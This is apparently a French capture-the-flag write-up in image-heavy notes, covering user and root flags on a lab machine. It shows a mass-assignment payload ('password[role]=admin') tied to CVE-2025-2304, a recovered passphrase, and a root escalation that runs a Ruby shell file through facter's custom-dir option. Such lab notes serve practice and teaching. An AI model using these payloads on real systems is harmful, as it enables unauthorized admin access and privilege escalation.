
# User Flag

![[IMG-20260201195831132.png]]

![[IMG-20260201195831144.png]]

![[IMG-20260201195831178.png]]

## [CVE-2025-2304](https://nvd.nist.gov/vuln/detail/CVE-2025-2304)

![[IMG-20260201195831259.png]]

![[IMG-20260201195831303.png]]



![[IMG-20260201195831358.png]]

On ajoute dans la requete:
```
password[role]=admin
```

![[IMG-20260201195831415.png]]

## [CVE-2024-46987](https://nvd.nist.gov/vuln/detail/CVE-2024-46987)

![[IMG-20260201195831471.png]]

2 users:
```
william et trivia
```

![[IMG-20260201195831540.png]]

![[IMG-20260201195831583.png]]

```
passphrase: dragonballz
```

![[IMG-20260201195831655.png]]


# Root flag

![[IMG-20260201195831700.png]]

![[IMG-20260201195831735.png]]

A retenir:
```
The first `.rb` file in the `/path/to/dir/` directory will be executed.
facter --custom-dir=/path/to/dir/ x
```

Payload:
![[IMG-20260201195831770.png]]

root.rb:
```
exec "/bin/sh"
```

![[IMG-20260201195831825.png]]

![[IMG-20260201195831933.png]]